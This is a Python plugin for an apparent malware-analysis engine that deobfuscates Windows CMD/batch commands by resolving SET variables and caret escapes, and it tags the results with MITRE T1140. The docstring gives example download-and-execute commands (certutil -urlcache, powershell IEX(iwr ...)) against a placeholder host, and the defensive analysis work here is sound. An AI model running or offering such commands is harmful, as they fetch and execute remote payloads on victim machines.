"""CMD / batch-file string-reconstruction plugin.

Handles the classic Windows CMD obfuscation dance:

    set A=cert&& set B=util&& !A!!B!.exe -urlcache -f http://x/y.exe    →  certutil.exe ...
    set U=powershell && %U% -c IEX(iwr http://x)                         →  powershell -c IEX(iwr http://x)
    %SystemRoot%\\System32\\certutil.exe -urlcache -f http://x/y.exe     →  (no-op, but tokens surfaced)
    c^m^d.exe /c wh^oami                                                 →  cmd.exe /c whoami

Design
------
* detect() fires only when SET-assignment + at least one `%VAR%` or `!VAR!`
  reference is present. Cheap regex scan.
* decode() rewrites references to their resolved values so the "true"
  command surfaces alongside the LOLBAS binary name for MITRE / IOC
  extractors and process-tree predictors.
* Precision-first: only tracks assignments to plain string literals /
  unquoted tokens. Nested expressions (e.g. `set X=%Y%%Z%`) are handled
  with two passes so the resolved value cascades.
"""
from __future__ import annotations

import re
from typing import Any, Dict, List, Tuple

from engine.decoder_base import BaseDecoder
from engine.models import (
    AnalysisContext,
    DetectResult,
    Fingerprint,
    MitreHint,
    PluginResult,
    TradecraftFlag,
)
from engine.registry import DecoderRegistry


# 1) `set VAR=value` — capture up to `&&`, `&`, `|`, closing-quote, or newline.
#    Value keeps its raw form (quotes preserved if the analyst wrote them).
_RX_SET = re.compile(
    r"""(?:^|[\s&|;("])set\s+([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([^&\n\r"|)]*?)(?=(?:\s*&&|\s*&|\s*\|\||\s*\||\s*["\n\r)]|$))""",
    re.IGNORECASE,
)

# 2) `%VAR%` — classic CMD variable expansion. Non-greedy, no whitespace
#    inside the name (real CMD doesn't allow that either).
_RX_PCT_VAR = re.compile(r"%([A-Za-z_][A-Za-z0-9_]*)%")

# 3) `!VAR!` — delayed-expansion (only meaningful when `SETLOCAL
#    EnableDelayedExpansion` or `cmd /V:ON` is active). We rewrite them
#    unconditionally — the analyst-facing output is the resolved command
#    either way.
_RX_BANG_VAR = re.compile(r"!([A-Za-z_][A-Za-z0-9_]*)!")

# 4) CMD in-string caret escape.  `c^m^d` → `cmd`.  Only strip the caret
#    when it's followed by another printable character on the same line;
#    a lone `^` at end-of-line means "line continuation" in real CMD, and
#    we don't collapse those (they change semantics).
_RX_CARET_ESCAPE = re.compile(r"\^([A-Za-z0-9%!/\\\"'&|<>=])")

# 5) `CALL VAR` / `CALL :label` — CALL introduces a re-parse pass in CMD.
#    For our purposes it's a marker that a variable name that follows is
#    invoked as a command (analogous to `& $var` in PowerShell). We only
#    detect it here — the actual reveal happens in `_reveal_invoked_var`.
_RX_CALL_VAR = re.compile(
    r"""(?:^|[\s&|;("])call\s+(?:%|!)?([A-Za-z_][A-Za-z0-9_]*)(?:%|!)?""",
    re.IGNORECASE,
)


def _collect_assignments(text: str) -> Dict[str, str]:
    """Extract `set VAR=value` pairs. Last write wins (real CMD semantics)."""
    assigns: Dict[str, str] = {}
    for m in _RX_SET.finditer(text):
        name = m.group(1)
        value = m.group(2).rstrip()
        # Strip surrounding quotes but only if they wrap the WHOLE value.
        if len(value) >= 2 and value[0] == value[-1] and value[0] in ("'", '"'):
            value = value[1:-1]
        assigns[name] = value
    return assigns


def _expand_percent_vars(text: str, assigns: Dict[str, str]) -> Tuple[str, int]:
    """Substitute `%VAR%` with the resolved literal. Multi-pass so nested
    references (`%A%%B%`) cascade cleanly."""
    if not assigns:
        return text, 0
    hits = 0
    for _pass in range(4):  # runaway guard — real chains stay well under this
        prev = text
        def _sub(m: re.Match) -> str:
            nonlocal hits
            name = m.group(1)
            if name in assigns:
                hits += 1
                return assigns[name]
            return m.group(0)
        text = _RX_PCT_VAR.sub(_sub, text)
        if text == prev:
            break
    return text, hits


def _expand_bang_vars(text: str, assigns: Dict[str, str]) -> Tuple[str, int]:
    """Same as %VAR% but for delayed expansion — used inside `cmd /V:ON`
    blocks."""
    if not assigns:
        return text, 0
    hits = 0
    for _pass in range(4):
        prev = text
        def _sub(m: re.Match) -> str:
            nonlocal hits
            name = m.group(1)
            if name in assigns:
                hits += 1
                return assigns[name]
            return m.group(0)
        text = _RX_BANG_VAR.sub(_sub, text)
        if text == prev:
            break
    return text, hits


def _strip_caret_escapes(text: str) -> Tuple[str, int]:
    """`c^m^d` → `cmd`. Preserves `^` at end-of-line (real line-continuation)."""
    hits = 0

    def _sub(m: re.Match) -> str:
        nonlocal hits
        hits += 1
        return m.group(1)

    return _RX_CARET_ESCAPE.sub(_sub, text), hits


def _reveal_call_var(text: str, assigns: Dict[str, str]) -> Tuple[str, int]:
    """RC2.7 CALL-of-variable reveal — analogous to ps-reconstruct's
    `_reveal_invoked_var`. Rewrites `CALL FOO` (where FOO is a resolved
    assignment) to include the resolved literal inline so keywords like
    `certutil` reach IOC / MITRE extractors even when the LOLBAS binary
    name only exists via CALL indirection."""
    if not assigns:
        return text, 0

    hits = 0
    pieces: List[str] = []
    last = 0
    for m in _RX_CALL_VAR.finditer(text):
        name = m.group(1)
        if name not in assigns:
            continue
        pieces.append(text[last:m.end()])
        pieces.append(f" <#=> {assigns[name]} <#=>")
        last = m.end()
        hits += 1
    if hits == 0:
        return text, 0
    pieces.append(text[last:])
    return "".join(pieces), hits


class CmdReconstructDecoder(BaseDecoder):
    id = "cmd-reconstruct"
    name = "CMD String Reconstruct"
    category = "reconstruct"
    cost = 2
    tags = ("cmd", "batch", "reconstruct", "deobfuscate", "delayed-expansion")
    schema_version = "1.0"

    def detect(self, payload: str, fp: Fingerprint, ctx: AnalysisContext) -> DetectResult:
        if not payload or len(payload) < 6:
            return DetectResult(confidence=0.0, why="Too short")
        signals: List[str] = []
        has_set = bool(_RX_SET.search(payload))
        has_pct = bool(_RX_PCT_VAR.search(payload))
        has_bang = bool(_RX_BANG_VAR.search(payload))
        has_caret = bool(_RX_CARET_ESCAPE.search(payload))
        # Only fire when SET has at least one matching %VAR% or !VAR!
        # reference. Otherwise it's just a plain assignment (no obfuscation
        # value) or a real env-var lookup (%TEMP%, %USERPROFILE%) that we
        # can't resolve without host state.
        if has_set and (has_pct or has_bang):
            signals.append("cmd-set-and-use")
        if has_bang:
            signals.append("cmd-delayed-expansion")
        if has_caret and re.search(r"[A-Za-z]\^[A-Za-z]", payload):
            signals.append("cmd-caret-escape")
        # CALL of a locally-defined variable → reveal candidate
        if has_set and _RX_CALL_VAR.search(payload):
            signals.append("cmd-call-var")
        if not signals:
            return DetectResult(confidence=0.0, why="No CMD reconstruction pattern")
        # Confidence: 0.6 for a single mild signal, 0.9 for the combo.
        # The combo needs to beat extract-wrapper (0.65) so reconstructed
        # LOLBAS names surface for MITRE / IOC extractors.
        conf = 0.9 if len(signals) >= 2 else (0.85 if "cmd-set-and-use" in signals else 0.6)
        return DetectResult(
            confidence=conf,
            why=f"CMD reconstruction signals: {', '.join(signals)}",
            args={"signals": signals},
        )

    def decode(self, payload: str, args: Dict[str, Any], ctx: AnalysisContext) -> PluginResult:
        text = payload
        notes: List[str] = []
        total_hits = 0

        # Strip caret escapes FIRST so `c^m^d.exe` becomes `cmd.exe` before
        # we scan for SET / %VAR% patterns (caret can hide `=` too).
        text, n = _strip_caret_escapes(text)
        if n:
            total_hits += n
            notes.append(f"Stripped {n} CMD caret escape(s)")

        assigns = _collect_assignments(text)

        text, n = _expand_percent_vars(text, assigns)
        if n:
            total_hits += n
            notes.append(f"Expanded {n} %VAR% reference(s)")

        text, n = _expand_bang_vars(text, assigns)
        if n:
            total_hits += n
            notes.append(f"Expanded {n} !VAR! delayed reference(s)")

        text, n = _reveal_call_var(text, assigns)
        if n:
            total_hits += n
            notes.append(f"Revealed {n} CALL-of-variable literal(s)")

        if total_hits == 0:
            return PluginResult(output=payload, notes=["cmd-reconstruct: no changes"])

        return PluginResult(
            output=text,
            notes=notes,
            mitre_hints=[
                MitreHint(
                    id="T1140", technique="Deobfuscate/Decode Files or Information",
                    tactic="Defense Evasion",
                    evidence=f"CMD variable/caret reconstruction ({total_hits} rewrite(s))",
                    source="archetype",
                ),
            ],
            tradecraft=[
                TradecraftFlag(
                    flag="cmd-string-obfuscation", severity="medium",
                    evidence="; ".join(notes),
                ),
            ],
            explanation=(
                "Rebuilt obfuscated CMD/batch command by expanding %VAR% / !VAR! "
                "references and stripping caret escapes so the underlying LOLBAS "
                "binary surfaces."
            ),
        )


DecoderRegistry.register(CmdReconstructDecoder())
